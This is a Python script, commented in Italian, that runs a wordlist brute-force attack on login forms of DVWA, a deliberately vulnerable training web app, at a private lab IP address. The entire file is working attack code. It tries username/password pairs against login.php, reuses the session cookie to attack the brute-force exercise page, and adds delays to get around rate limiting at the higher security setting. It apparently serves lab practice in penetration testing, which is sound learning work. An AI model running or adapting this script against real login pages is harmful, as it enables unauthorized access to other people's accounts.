### IMPORT MODULI

import requests, ipaddress, os, time

### DICHIARAZIONE FUNZIONI

def is_valid_ip(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        print("Inserisci una stringa con indirizzo IP valido (e.g. 192.168.1.6) \n")
        return False

def brute_force(user_list, pwd_list, ip, context, possible_err_msg, security_lev, cookies = None):
    url_login = "http://" + ip + context
    error_msg = possible_err_msg
    for user in user_list:
        user = user.rstrip()
        for pwd in pwd_list:
            pwd = pwd.rstrip()
            payload_form_login = {'username': user, 'password': pwd, 'Login': 'Login'} 
            if(cookies == None):
                 print ("Attacco bruteforce login.php!\n")
                 print (user, "-", pwd)
                 sess_id = get_session_id(payload_form_login, url_login)
                 cookie_session = {'security': security_lev, 'PHPSESSID': sess_id}
                 check_credentials = check_login_post(payload_form_login, url_login, cookie_session, error_msg)
                 if(check_credentials == 1):
                    print("Session ID:", sess_id)
                    msg_failed_brute = '<pre><br>Username and/or password incorrect.</pre>'
                    brute_force(user_list, pwd_list, ip, "/dvwa/vulnerabilities/brute/", msg_failed_brute, security_lev, cookie_session)
                 else:
                    print("Credenziali non valide!")
            else:
                 print ("       Attacco bruteforce context /vulnerabilities/brute/!\n")
                 print ("       ",user, "-", pwd)
                 new_check_credentials = check_login_get(payload_form_login, url_login, cookies, error_msg)
                 if(new_check_credentials == 1):
                      return 0
                 if(security_lev == "high"):
                      time.sleep(4)

def check_login_post(payload, url, cookie, error_msg):
        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        
        target_page_obj_post = requests.post(url, headers = headers_login, cookies = cookie ,data = payload)
        if(error_msg in target_page_obj_post.text):
             print("Login /login.php KO!\n")
             return 0
        else:
             print("Login /login.php OK!\n")
             return 1

def check_login_get(payload, url, cookie, error_msg):
        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        target_page_obj_get = requests.get(url, headers = headers_login, cookies = cookie , params = payload)
        if(error_msg in target_page_obj_get.text):
             print("       Login /dvwa/vulnerabilities/brute/ KO!\n")
             return 0
        else:
            print("        Login /dvwa/vulnerabilities/brute/ OK!\n")
            return 1
        
def get_session_id(payload, url):
    headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
    session = requests.Session() 
    target_page_obj_sess = session.get(url, headers = headers_login, params = payload)
    phpsessid = target_page_obj_sess.cookies['PHPSESSID']
    return phpsessid
  
        
### DICHIARAZIONE VARIABILI E CHECK INPUT UTENTE

ip_target = "192.168.50.101"
path_user = "usernames.lst"
path_password = "passwords.lst"
security_lev = "low"
#ip_target = ""
#path_user = ""
#path_password = ""


'''
#Input IP target con validazione
while True:
    #input dall'utente per la stringa ip_target
    ip_target = str(input("Inserisci l'indirizzo IP del target:\n"))
    #esce dall'iterazione solo se l'ip è valido (call function is_valid_ip definita in precedenza)
    if (is_valid_ip(ip_target)):
        break
#chiede l'inserimento del path del file con la lista utenti finchè non viene indicato un path di un file
while not os.path.isfile(path_user):
    #input dall'utente per la stringa path_user
    path_user = str(input("Inserisci percorso file usernames:\n"))

#chiede l'inserimento del path del file con la lista password finchè non viene indicato un path di un file
while not os.path.isfile(path_password):
    #input dall'utente per la stringa path_password
    path_password = str(input("Inserisci percorso file passwords:\n"))
'''

### CORPO PRINCIPALE DEL CODICE

#definizione e apertura file contenenti password e username
username_file = open(path_user)
password_file = open(path_password)

#popolate le variabili list che conterranno la lista di user e password tramite funzione readlines
user_list_login = username_file.readlines()
pwd_list_login = password_file.readlines()


msg_failed_login = '<div class="message">Login failed</div>'


brute_force(user_list_login, pwd_list_login, ip_target, "/dvwa/login.php", msg_failed_login, security_lev)
